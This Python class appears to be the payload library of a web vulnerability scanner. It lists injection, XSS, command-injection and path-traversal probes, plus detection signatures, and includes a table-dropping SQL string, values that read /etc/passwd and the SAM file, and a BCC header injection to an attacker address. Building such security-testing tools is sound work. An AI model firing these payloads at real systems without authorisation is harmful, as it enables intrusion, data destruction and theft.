class AttackPayloads:

    SQL_INJECTION = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR '1'='1' --",
        "'; DROP TABLE users--",
        "admin'--",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR sleep(5)--",
        "' WAITFOR DELAY '00:00:05'--",
    ]

    NOSQL_INJECTION = [
        {"$ne": None},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$where": "sleep(5000)"},
        "admin' || '1'=='1",
    ]

    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
    ]

    COMMAND_INJECTION = [
        "; whoami",
        "&& whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        "; id",
        "&& id",
        "; uname -a",
    ]

    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "../../../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]

    TEMPLATE_INJECTION = [
        "{{7*7}}",
        "${7*7}",
        "{{config}}",
        "{{self}}",
        "<%= 7*7 %>",
    ]

    BUFFER_OVERFLOW = [
        "A" * 1000,
        "A" * 5000,
        "A" * 10000,
        "%x%x%x%x%x%x%x",
    ]

    SPECIAL_CHARS = [
        "\x00",
        "\n",
        "\r",
        "../../",
        "{{",
        "}}",
        "${",
    ]

    TYPE_CONFUSION = [
        None,
        True,
        False,
        [],
        {},
        0,
        -1,
        999999999999999,
        "null",
        "undefined",
    ]

    INTEGER_ATTACKS = [
        0,
        -1,
        -2147483648,
        2147483647,
        999999999999999999,
    ]

    EMAIL_ATTACKS = [
        "test@example.com\nBCC:evil@attacker.com",
        "test+<script>alert(1)</script>@example.com",
        "test@evil.com%00@example.com",
    ]

    @classmethod
    def get_all_categories(cls):
        return {
            "sql_injection": cls.SQL_INJECTION,
            "nosql_injection": cls.NOSQL_INJECTION,
            "xss": cls.XSS_PAYLOADS,
            "command_injection": cls.COMMAND_INJECTION,
            "path_traversal": cls.PATH_TRAVERSAL,
            "template_injection": cls.TEMPLATE_INJECTION,
            "buffer_overflow": cls.BUFFER_OVERFLOW,
            "special_chars": cls.SPECIAL_CHARS,
            "type_confusion": cls.TYPE_CONFUSION,
            "integer_attacks": cls.INTEGER_ATTACKS,
            "email_attacks": cls.EMAIL_ATTACKS,
        }

    @classmethod
    def generate_contextual_payloads(cls, param_name: str):
        param = param_name.lower()

        if "id" in param:
            return cls.INTEGER_ATTACKS + ["1 OR 1=1", -999999]

        if "user" in param or "email" in param:
            return cls.SQL_INJECTION + cls.EMAIL_ATTACKS

        if "search" in param or "q" in param:
            return cls.XSS_PAYLOADS + cls.SQL_INJECTION

        if "cmd" in param or "exec" in param:
            return cls.COMMAND_INJECTION

        return (
            cls.SQL_INJECTION
            + cls.XSS_PAYLOADS
            + cls.COMMAND_INJECTION
            + cls.SPECIAL_CHARS
        )

    @classmethod
    def generate_combo_payloads(cls):
        combos = []

        for sqli in cls.SQL_INJECTION[:3]:
            for xss in cls.XSS_PAYLOADS[:2]:
                combos.append(f"{sqli} {xss}")

        for cmd in cls.COMMAND_INJECTION[:3]:
            combos.append(f"test {cmd}")

        return combos

    @classmethod
    def get_aggressive_payloads(cls, param_name: str):
        base = cls.generate_contextual_payloads(param_name)
        combos = cls.generate_combo_payloads()

        return base + combos

    @classmethod
    def detection_signatures(cls):
        return {
            "sql_injection": ["sql", "syntax", "mysql", "sqlite", "error"],
            "xss": ["<script>", "alert(", "<img", "<svg"],
            "command_injection": ["root", "uid=", "gid=", "linux"],
            "path_traversal": ["root:x", "bin/bash", "windows"],
        }